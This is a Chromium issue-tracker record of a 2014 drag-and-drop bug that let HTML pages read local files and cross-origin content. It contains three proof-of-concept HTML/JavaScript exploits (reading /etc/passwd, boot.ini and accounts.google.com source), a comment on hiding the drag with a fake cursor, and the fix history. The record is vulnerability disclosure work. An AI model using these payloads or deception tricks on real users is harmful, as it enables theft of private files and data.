# Security: html files from file URLs can read data from other file URLs via drag-and-drop

| Field | Value |
|-------|-------|
| **Issue ID** | [40078973](https://issues.chromium.org/issues/40078973) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Input |
| **Reporter** | ja...@googlemail.com |
| **Assignee** | dc...@chromium.org |
| **Created** | 2014-02-24 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

HTML files that were loaded from file:// URLs are able to read other local files. This works if the user can be tricked into performing a drag-and-drop interaction with the malicious file.

It seems that when a link to a file:// URL that is located on a page from a file:// URL is dragged, Chromium automatically grants the target of the drop event read access to the file.

**VERSION**  

Chrome Version: 33.0.1750.117 (stable)  

Operating System: Debian Wheezy

**REPRODUCTION CASE**

- copy this code into a .html file
- open the file in Chromium
- perform a drag-and-drop action from "dragme" to "here"

You should now see the contents of /etc/passwd (if you're on a linux system or so).

====================

<html>
<a id="b" href="file:///etc/passwd">dragme</a>
<br><br><br><br><br><br>
<div id="c" ondragover="event.preventDefault()">here</div>
<div id="o"></div>
<script>
document.getElementById('c').ondrop = function (e) {
e.preventDefault();
var reader = new FileReader();
reader.onloadend = function() {
document.getElementById('o').innerHTML = reader.result;
};
reader.readAsBinaryString(e.dataTransfer.files[0]);
return false;
};
</script>
</html>
====================

## Timeline

### ja...@googlemail.com (2014-02-24)

On windows, I can't reproduce this with version "31.0.1650.57 m", but I can reproduce it in "33.0.1750.117 m" if I change the code to this:

====================
<html>
<body>
<span id="b">dragme</span>
<br><br><br><br><br><br>
<div id="c" ondragover="event.preventDefault()">here</div>
<div id="o"></div>

<script>
document.getElementById('c').ondrop = function(e) {
  var reader = new FileReader();
  reader.onloadend = function() {
    document.getElementById('o').innerHTML = reader.result;
  };
  reader.readAsBinaryString(e.dataTransfer.files[0]);
}

var b = document.getElementById('b');
b.draggable = true;
b.ondragstart = function onDragStart(e) {
  e.dataTransfer.setData("DownloadURL", "application/octet-stream:boot.ini:file:///C:/boot.ini");
  e.dataTransfer.effectAllowed = "copy";
};
</script>
</body>
</html>
====================

And actually, this is MUCH worse. On windows, a website from an http URL can also use this to e.g. request the source code of https://accounts.google.com/ (but access to local files from http URLs is not possible):

====================
<html>
<body>
<span id="b">dragme</span>
<br><br><br><br><br><br>
<div id="c" ondragover="event.preventDefault()">here</div>
<textarea id="o" cols="200" rows="50"></textarea>

<script>
document.getElementById('c').ondrop = function(e) {
  var reader = new FileReader();
  reader.onloadend = function() {
    document.getElementById('o').value = reader.result;
  };
  reader.readAsBinaryString(e.dataTransfer.files[0]);
}

var b = document.getElementById('b');
b.draggable = true;
b.ondragstart = function onDragStart(e) {
  e.dataTransfer.setData("DownloadURL", "application/octet-stream:foo.txt:https://accounts.google.com/");
  e.dataTransfer.effectAllowed = "all";
};
</script>
</body>
</html>
====================

### ja...@googlemail.com (2014-02-24)

Could someone with permission to change the bug summary/title please change it to something like "Security: html files can read data from other URLs via drag-and-drop"? Or should the information in https://crbug.com/chromium/346135#c1 be a seperate bug?

### ts...@chromium.org (2014-02-25)

Origin bypass => severity high.

### ts...@chromium.org (2014-02-25)

Possibly fixed by https://codereview.chromium.org/135633002/ in M34, assigning to dcheng to confirm.

### ts...@chromium.org (2014-02-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-25)

[Empty comment from Monorail migration]

### js...@chromium.org (2014-02-26)

Seems to me like the drag-and-drop requirement is enough to bump this down to medium, because it's a non-trivial user interaction. However, is there a way to reduce the drag gesture to effectively a click by using the right event handlers (because that would be scarier)?

@jannhorn - The process separation prevents web renderers from reading file: URLs, even if this bug in the origin handling would otherwise allow it.


### ja...@googlemail.com (2014-02-26)

@jschuh I don't see a way to trigger this without actual mouse movement while the mouse is held down.

But is drag-and-drop really non-trivial? A website could e.g. spoof a scrollbar somewhere on the page, and as soon as the user tries to move it, he initiates a drag-and-drop action without wanting it. And if you're worried that the user might notice the weird cursor (because it doesn't seem to be possible to prevent the drag-and-drop cursor from getting visible as far as I can tell), you could hide the actual cursor as long as there is no drag-and-drop using CSS and create a fake cursor that moves with slightly different speed. Then, you could force the real cursor to "drift" to the right border of the screen or into an irritating "ad" or so, making it hard to spot the actual cursor while it appears during drag-and-drop, and let the real cursor "drift" back afterwards.

So I think that with a little bit of programming work, this can be used to attack any Windows user who is willing to scroll something by dragging a scrollbar without making the attack really obvious.

### dc...@chromium.org (2014-02-26)

My first thought is that we should apply same origin policy to DownloadURL creation. But I wonder if this will break things like Gmail.

### dc...@chromium.org (2014-02-26)

As for the other part of the bug, resolving it is somewhat complicated:
1) We don't want a page to be able to forge a file:// link.
2) Dragging file:// links into a browser should still navigate though.

I'll have to think about this one more.

### dc...@chromium.org (2014-02-26)

[Empty comment from Monorail migration]

### dc...@chromium.org (2014-02-26)

[Empty comment from Monorail migration]

### ji...@chromium.org (2014-02-26)

I could not repro this on 31.0.1650.57 m on my Windows machine.

IMO, we should not support file url and we should do origin check for the DownloadURL creation, just to be safe. This will not cause other things to break.

### dc...@chromium.org (2014-02-26)

[Empty comment from Monorail migration]

### sc...@chromium.org (2014-02-26)

[Empty comment from Monorail migration]

### dc...@chromium.org (2014-02-26)

Though we've had trouble reproing this, the scenarios reported seem plausible. DownloadURL essentially wraps the URL in a file that's asynchronously downloaded, with some tricks so that we only see the 'completed file'. And since we dragged that file into Chrome, we treat it as a dragging file in... and now you read stuff cross origin.

I've been thinking of ways to fix this. One potential way is taint tracking--if a drag is marked as tainted (e.g. renderer originated), we filter it out in RenderViewHostImpl::DragTargetDragEnter so that it's permitted as a navigation target, but not to be read by FileReader.

Linux is also problematic for a separate reason; since filenames/URLs are combined in one type in the X clipboard, this essentially lets a page 'elevate' its privilege to forge filenames in the data transfer object. But if you read RenderViewHostImpl::DragTargetDragEnter, it actually implicitly trusts filenames supplied to it.

### dc...@chromium.org (2014-02-26)

+erg for Linux

### dx...@chromium.org (2014-03-05)

ping ...

### dc...@chromium.org (2014-03-07)

kinuko, I'm working on a Blink CL to suppress exposing Files to scripting if the drag is renderer originated. Do you know if we need to do some similar work for dragging filesystem support?

### ja...@googlemail.com (2014-03-07)

@jianli When you tried to repro it on Windows, you did use the third PoC I posted, right? I just tried it again in Chrome 33.0.1750.117 m in my Windows XP VM, it worked, let it update to 33.0.1750.146 m, still worked. Could it be that you have a newer Windows version and it doesn't work there anymore?

For a short moment, after you've dragged "dragme" over the "here" text, there might be the "you can't drop here" symbol – in that case, you have to move the mouse a little bit more before you can drop.

### ja...@googlemail.com (2014-03-07)

Just tried it in a fresh Windows 7 VM with Chrome 33.0.1750.146 m, also works there.

### dc...@chromium.org (2014-03-11)

[Empty comment from Monorail migration]

### ki...@chromium.org (2014-03-11)

I just tested this on my windows machine /w 33.0.1750.117 (Official Build 252094) m and could repro it, either for local file URL or for http URL (and for filesystem URL too).

For dragged filesystem support I don't *think* we need some special care, as it's handled using internal ID which cannot be expressed as neither URL or filenames.

### dc...@chromium.org (2014-03-18)

I've got a really ugly blink-side CL for patching this issue at https://codereview.chromium.org/193803002/. I haven't had time to put together the corresponding Chrome CL yet; once I've done that, I'll work on landing the CLs.

### bu...@chromium.org (2014-03-21)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=169711

------------------------------------------------------------------
r169711 | dcheng@chromium.org | 2014-03-21T01:19:03.625399Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragData.cpp?r1=169711&r2=169710&pathrev=169711
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/clipboard/DataObject.h?r1=169711&r2=169710&pathrev=169711
   M http://src.chromium.org/viewvc/blink/trunk/public/platform/WebDragData.h?r1=169711&r2=169710&pathrev=169711
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragData.h?r1=169711&r2=169710&pathrev=169711
   M http://src.chromium.org/viewvc/blink/trunk/Source/web/WebDragData.cpp?r1=169711&r2=169710&pathrev=169711
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragController.cpp?r1=169711&r2=169710&pathrev=169711

Prevent web content from forging File entries in drag and drop.

There are two separate bugs that this and the corresponding Chrome patch
aim to address:
- On Linux, files and URLs are transferred in the same MIME type, so
  it's impossible to tell if a filename was set by a trusted source or
  forged by web content.
- DownloadURL triggers the download of potentially cross-origin content.
  On some platforms, such as Windows, the resulting download is treated
  as a file drag by Chrome, allowing web content to read cross origin
  content.

In order to prevent web content from doing this, drags initiated by a
renderer will be marked as tainted. When tainted drags are over web
content, Blink will only allow the resulting filename to be used for
navigation, with Chrome enforcing this with the sandbox policy.

Unfortunately, this does break some potentially interesting use cases
like being able to drag an attachment from Gmail to a file input, but
those will have to be separately addressed, if possible.

BUG=346135
R=abarth@chromium.org, tony@chromium.org

Review URL: https://codereview.chromium.org/193803002
-----------------------------------------------------------------

### dx...@chromium.org (2014-03-25)

dcheng@, how's this looking on the canary?

### dc...@chromium.org (2014-03-25)

The Chrome part of the change is still in the CQ. The Blink part of the change is actually unnecessary as it turned out.

### bu...@chromium.org (2014-03-25)

------------------------------------------------------------------
r259353 | dcheng@chromium.org | 2014-03-25T22:04:06.817240Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_win.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/gtk_dnd_util.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/gtk_dnd_util.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/public/common/drop_data.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/public/common/drop_data.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_aurax11.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/web_contents/web_contents_view_aura.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_aurax11.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/web_contents/web_drag_dest_mac.mm?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/web_contents/web_drag_dest_gtk.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/web_contents/web_drag_source_gtk.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/renderer_host/render_view_host_impl.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_aura.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/clipboard/clipboard_aurax11.cc?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_aura.h?r1=259353&r2=259352&pathrev=259353
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_win.cc?r1=259353&r2=259352&pathrev=259353

Mark drags starting in web content as tainted to avoid file path forgery

This patch takes the simplest possible approach and simply clears any
filename data when the browser-side dragenter handler notices that a
drag originated from a Chrome renderer. This breaks file:// URL dragging
within Chrome, but it turns out this is already mostly broken anyway.
Dragging file:// URLs is filtered out by FilterURL, since we don't
GrantRequestSpecificFileURL to the renderer, so it generally ends up
loading about:blank anyway.

The ChromeOS bits are left unimplemented for the moment. The specific
security issues fixed by this patch don't presently affect Aura because
it doesn't implement the DownloadURL protocol at all, and it doesn't
get confused between URLs and filenames like Linux. While it would be
nice to implement this for ChromeOS, doing so breaks drags from the
File Manager app.

BUG=346135
R=creis@chromium.org, erg@chromium.org, sky@chromium.org, tony@chromium.org, tsepez@chromium.org

Review URL: https://codereview.chromium.org/207013003
-----------------------------------------------------------------

### bu...@chromium.org (2014-03-25)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=169979

------------------------------------------------------------------
r169979 | dcheng@chromium.org | 2014-03-25T22:14:53.555907Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragData.h?r1=169979&r2=169978&pathrev=169979
   M http://src.chromium.org/viewvc/blink/trunk/Source/web/WebDragData.cpp?r1=169979&r2=169978&pathrev=169979
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragController.cpp?r1=169979&r2=169978&pathrev=169979
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/page/DragData.cpp?r1=169979&r2=169978&pathrev=169979
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/clipboard/DataObject.h?r1=169979&r2=169978&pathrev=169979
   M http://src.chromium.org/viewvc/blink/trunk/public/platform/WebDragData.h?r1=169979&r2=169978&pathrev=169979

Revert 169711 "Prevent web content from forging File entries in ..."

As it turns out, we only needed to patch the Chrome side.

> Prevent web content from forging File entries in drag and drop.
> 
> There are two separate bugs that this and the corresponding Chrome patch
> aim to address:
> - On Linux, files and URLs are transferred in the same MIME type, so
>   it's impossible to tell if a filename was set by a trusted source or
>   forged by web content.
> - DownloadURL triggers the download of potentially cross-origin content.
>   On some platforms, such as Windows, the resulting download is treated
>   as a file drag by Chrome, allowing web content to read cross origin
>   content.
> 
> In order to prevent web content from doing this, drags initiated by a
> renderer will be marked as tainted. When tainted drags are over web
> content, Blink will only allow the resulting filename to be used for
> navigation, with Chrome enforcing this with the sandbox policy.
> 
> Unfortunately, this does break some potentially interesting use cases
> like being able to drag an attachment from Gmail to a file input, but
> those will have to be separately addressed, if possible.
> 
> BUG=346135
> R=abarth@chromium.org, tony@chromium.org
> 
> Review URL: https://codereview.chromium.org/193803002

TBR=dcheng@chromium.org

Review URL: https://codereview.chromium.org/211853002
-----------------------------------------------------------------

### dx...@chromium.org (2014-03-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-03-27)

------------------------------------------------------------------
r260001 | dcheng@chromium.org | 2014-03-27T21:51:11.074839Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/public/common/drop_data.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/public/common/drop_data.h?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_aurax11.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_aurax11.h?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/browser/web_contents/web_contents_view_aura.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/browser/web_contents/web_drag_dest_mac.mm?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/browser/web_contents/web_drag_dest_gtk.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/browser/web_contents/web_drag_source_gtk.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/clipboard/clipboard_aurax11.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_aura.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/content/browser/renderer_host/render_view_host_impl.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_aura.h?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_win.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data_provider_win.h?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/gtk_dnd_util.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/gtk_dnd_util.h?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data.cc?r1=260001&r2=260000&pathrev=260001
   M http://src.chromium.org/viewvc/chrome/branches/1847/src/ui/base/dragdrop/os_exchange_data.h?r1=260001&r2=260000&pathrev=260001

Merge 259353 "Mark drags starting in web content as tainted to a..."

> Mark drags starting in web content as tainted to avoid file path forgery
> 
> This patch takes the simplest possible approach and simply clears any
> filename data when the browser-side dragenter handler notices that a
> drag originated from a Chrome renderer. This breaks file:// URL dragging
> within Chrome, but it turns out this is already mostly broken anyway.
> Dragging file:// URLs is filtered out by FilterURL, since we don't
> GrantRequestSpecificFileURL to the renderer, so it generally ends up
> loading about:blank anyway.
> 
> The ChromeOS bits are left unimplemented for the moment. The specific
> security issues fixed by this patch don't presently affect Aura because
> it doesn't implement the DownloadURL protocol at all, and it doesn't
> get confused between URLs and filenames like Linux. While it would be
> nice to implement this for ChromeOS, doing so breaks drags from the
> File Manager app.
> 
> BUG=346135
> R=creis@chromium.org, erg@chromium.org, sky@chromium.org, tony@chromium.org, tsepez@chromium.org
> 
> Review URL: https://codereview.chromium.org/207013003

TBR=dcheng@chromium.org

Review URL: https://codereview.chromium.org/212693004
-----------------------------------------------------------------

### dc...@chromium.org (2014-03-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-03-28)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-03-28)

[Empty comment from Monorail migration]

### ja...@googlemail.com (2014-03-29)

Is this eligible for a reward? http://dev.chromium.org/Home/chromium-security/security-labels says "Any external report for a confirmed medium-or-higher severity vulnerability needs: reward-topanel.".

### ti...@chromium.org (2014-04-04)

Right you are, Jann. FYI - the "reward-topanel" sweep process happens once a week.

### ti...@chromium.org (2014-04-04)

[Comment Deleted]

### in...@chromium.org (2014-04-04)

Lowering severity since it needs local files and drag interation gesture.

### ja...@googlemail.com (2014-04-04)

@inferno
> Lowering severity since it needs local files and drag interation gesture.
See my https://crbug.com/chromium/346135#c1: "And actually, this is MUCH worse. On windows, a website from an http URL can also use this to e.g. request the source code of https://accounts.google.com/ (but access to local files from http URLs is not possible)"

Yes, it needs a drag gesture, but the Windows variant does not need local files.

### ti...@chromium.org (2014-04-05)

[Comment Deleted]

### ti...@chromium.org (2014-04-05)

[Comment Deleted]

### ti...@chromium.org (2014-04-05)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-04-05)

Jann - how would you like to be credited in the release notes? I'll go with "Jann Horn" unless you tell me otherwise.

### ja...@googlemail.com (2014-04-05)

@timwillis That sounds good, thanks.

### ja...@googlemail.com (2014-04-14)

Why does http://googlechromereleases.blogspot.de/2014/04/stable-channel-update.html list this as "Local cross-origin bypass"? Why "local"? As stated in https://crbug.com/chromium/346135#c1, on Windows, the vuln allowed websites with an http(s) origin to access other http(s) websites.

### ti...@chromium.org (2014-04-14)

Thanks for the report - $1000 for this one. I'll start the payment process today.

### ti...@chromium.org (2014-04-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-04-15)

c#45: Looks like we phrased it wrong. we didn't read your c#1. Sorry about that. But the reward amount looks correct since drag and drop is still a significant user interaction.

### ti...@chromium.org (2014-04-23)

Processing via our e-payment system can take up to 30 days, but the reward should be on its way to you. Thanks again for your help!


### cl...@chromium.org (2014-07-04)

Bulk update: removing view restriction from closed bugs.

### bu...@chromium.org (2014-07-15)

------------------------------------------------------------------
r283226 | dcheng@chromium.org | 2014-07-15T19:04:37.636866Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/remoting/host/clipboard_win.cc?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/base/win/scoped_hglobal.h?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/clipboard/clipboard_util_win.cc?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/printing/backend/print_backend_win.cc?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/clipboard/clipboard_util_win.h?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_win_unittest.cc?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_unittest.cc?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/ui_unittests.gyp?r1=283226&r2=283225&pathrev=283226
   M http://src.chromium.org/viewvc/chrome/trunk/src/ui/base/dragdrop/os_exchange_data_provider_win.cc?r1=283226&r2=283225&pathrev=283226

Add a unit test that filenames aren't unintentionally converted to URLs.

Also fixes two issues in OSExchangeDataProviderWin:
- It used a disjoint set of clipboard formats when handling
  GetUrl(..., true /* filename conversion */) vs GetFilenames(...), so the
  actual returned results would vary depending on which one was called.
- It incorrectly used ::DragFinish() instead of ::ReleaseStgMedium().
  ::DragFinish() is only meant to be used in conjunction with WM_DROPFILES.

BUG=346135

Review URL: https://codereview.chromium.org/380553002
-----------------------------------------------------------------

### bu...@chromium.org (2014-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e93dc535728da259ec16d1c3cc393f80b25f64ae

commit e93dc535728da259ec16d1c3cc393f80b25f64ae
Author: dcheng@chromium.org <dcheng@chromium.org@0039d316-1c4b-4281-b951-d872f2087c98>
Date: Tue Jul 15 19:04:37 2014

Add a unit test that filenames aren't unintentionally converted to URLs.

Also fixes two issues in OSExchangeDataProviderWin:
- It used a disjoint set of clipboard formats when handling
  GetUrl(..., true /* filename conversion */) vs GetFilenames(...), so the
  actual returned results would vary depending on which one was called.
- It incorrectly used ::DragFinish() instead of ::ReleaseStgMedium().
  ::DragFinish() is only meant to be used in conjunction with WM_DROPFILES.

BUG=346135

Review URL: https://codereview.chromium.org/380553002

git-svn-id: svn://svn.chromium.org/chrome/trunk/src@283226 0039d316-1c4b-4281-b951-d872f2087c98



### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/346135?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078973)*
